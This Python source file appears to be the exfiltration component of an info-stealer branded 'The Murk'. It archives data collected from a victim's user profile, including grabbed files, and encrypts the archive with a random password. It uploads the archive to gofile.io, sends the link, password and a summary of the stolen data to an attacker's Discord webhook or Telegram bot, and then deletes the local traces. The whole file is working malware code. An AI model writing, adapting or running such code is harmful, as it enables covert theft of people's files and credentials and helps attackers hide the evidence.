from shutil import make_archive,rmtree
from requests import post, get
from os import chdir,remove, environ, sep
from manager.logger import Log
from random import randint
from pyzipper import AESZipFile,ZIP_STORED,WZ_AES
from json import dumps
from preferences.config import config

def upload_file_to_gofile(file_path):
	try:
		server = get("https://api.gofile.io/getServer")
		if server.status_code == 200:
			server = server.json()["data"]["server"]
			response = post(f'https://{server}.gofile.io/uploadFile', files={'file': open(file_path, 'rb')})
			if response.status_code == 200:
				return response.json()["data"]["downloadPage"]
			else:
				Log(f"gofile(upload) ---> {response}")
			return None
		else:
			Log(f"gofile(get server) ---> {server}")
	except Exception as e:
		Log(f"gofile ---> {e}")
		return None

def MakeZip(user):
	Temp = environ['USERPROFILE'] + sep + r'AppData\Local\Temp'
	dox = "qwertyuiopasdfghjklzxcvbnm1234567890"
	pwd_str = ""
	name = ""
	for i in range (40):
		name += dox[randint(0,len(dox)-1)]
	for i in range (60):
		pwd_str += dox[randint(0,len(dox)-1)]
	password = bytes(pwd_str, "UTF-8")
	
	try:
		chdir(Temp)
		make_archive(fr'{Temp}\logs', 'zip', f'{user}\\{config.pathToLogs}')
		with AESZipFile(f'{name}.zip','w',compression=ZIP_STORED,encryption=WZ_AES) as logs:
			logs.setpassword(password)
			logs.write(r'logs.zip')
		remove("logs.zip")
		return[f"{Temp}/{name}.zip",pwd_str]
	except Exception as e:
		Log(f"MakeZip ---> {e}")
		return None


def Clean(user):
	rmtree(f'{user}\\{config.pathToLogs}\\Files\\File-Grubber', ignore_errors=True)
	rmtree(f'{user}\\{config.pathToLogs}', ignore_errors=True)

def MsgForDiscord(message, url):
	message = message.replace('<b>', '**')
	message = message.replace('</b>', '**')
	message = message.replace('<code>', '`')
	message = message.replace('</code>', '`')
	message = message.replace('<u>', '__')
	message = message.replace('</u>', '__')
	message = message.replace('<i>', '*')
	message = message.replace('</i>', '*')
	message = message.replace(f"<a href=\"{str(url)}\">🔗Link</a>",f"[🔗Link]({str(url)})")
	return message




def Send(sendData, msgInfo):
	user = environ['USERPROFILE']
	zipInfo = []
	Log("===========Conclusion===========")

	zipInfo = MakeZip(user)
	Clean(user)
	if zipInfo == None:
		return

	url = upload_file_to_gofile(f'{zipInfo[0]}')
	remove(f'{zipInfo[0]}')

	print(url)
	print(zipInfo[1])
	
	message = f"<u><b>🛑hey bro, see The Murk results🛑</b></u>\n<a href=\"{str(url)}\">🔗Link</a>\n📜Password: <code>{zipInfo[1]}</code>\n\n<i>⇓Collected data⇓</i>\n{msgInfo[0]}{msgInfo[1]}"

	if sendData[0] == 0:
		message = MsgForDiscord(message, url)
		message+="\n\n\n**The Murk|by Nick Vinesmoke**"
		message+="\n@everyone"
		try:
			response = post(sendData[1], data=dumps({"content": message}), headers={'Content-Type': 'application/json'})
		except Exception as e:
			Log(f"Send(post) ---> {e}")
			response = e
		Log(f"Send(response) ---> {response}")
	if sendData[0] == 1:
		message+="\n\n\n<b>The Murk|by Nick Vinesmoke</b>"
		try:
			response = post(f'https://api.telegram.org/bot{sendData[1]}/sendMessage', data={"chat_id": int(sendData[2]), "text": message, "parse_mode": "HTML", "disable_web_page_preview": True})
		except Exception as e:
			Log(f"Send(post) ---> {e}")
			response = e
		Log(f"Send(response) ---> {response}")